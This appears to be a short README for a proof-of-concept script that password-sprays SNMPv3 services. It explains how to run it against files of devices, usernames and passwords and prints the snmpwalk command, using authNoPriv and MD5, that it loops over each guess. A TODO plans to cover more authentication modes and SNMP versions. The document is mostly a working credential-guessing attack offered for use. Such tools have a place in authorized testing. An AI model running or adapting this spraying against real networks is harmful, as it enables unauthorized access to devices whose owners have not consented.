# This POC Script will password spray SNMP V3 Connections

- In essence it will run the following command.
- To run you chmod +x the script.
  - Then call it ./myscript.sh
  - It prompts you for three files ( devices, usernames, passwords)
### This is the command it runs    

snmpwalk \
        -v3 \
        -t 2 \
        -r 1 \
        -l authNoPriv \
        -u "$USER" \
        -a MD5 \
        -A "$PASS" \
        "$HOST" \
        1.3.6.1.2.1.1 >/dev/null 2>&1

# TODO 
### Add Auth and Priv Type
- Right now it's only using authNoPriv anad MD5, I want it to iterate through all variations.
- Maybe we'll go back and try it on V1 and V2 but for now V3 is good. 
